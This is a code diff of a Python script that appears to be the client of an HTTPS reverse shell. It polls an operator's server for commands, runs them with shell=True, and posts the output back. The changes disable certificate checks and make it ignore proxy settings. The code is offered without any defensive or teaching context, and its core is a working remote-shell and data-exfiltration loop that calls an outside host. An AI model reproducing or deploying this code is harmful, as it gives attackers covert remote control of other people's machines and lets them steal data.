@@ -47,6 +47,8 @@ __email__ = "dggsoares at gmail"
 __status__ = "Development"
 __date__ = 20190411
 
+requests.packages.urllib3.disable_warnings()  # Disable SSL verify warnings
+
 
 def get(command, session, base_url):
     get, path = command.split('&')
@@ -71,22 +73,24 @@ def put(command, session, base_url):
 
 
 def spawn_shell(command, session, base_url):
-    CMD = subprocess.Popen(command,
+    cmd = subprocess.Popen(command,
                            shell=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            stdin=subprocess.PIPE
                            )
-    session.post(url=base_url, data=CMD.stdout.read())
-    session.post(url=base_url, data=CMD.stderr.read())
+    session.post(url=base_url, data=cmd.stdout.read())
+    session.post(url=base_url, data=cmd.stderr.read())
 
 
 def main(args):
     base_url = f'https://{args.server}:{args.port}'
     session = requests.Session()
+    session.trust_env = False
+    session.verify = False
 
     while True:
-        r = session.get(base_url, verify=False)
+        r = session.get(base_url)
         command = r.text
 
         if 'quit' in command:
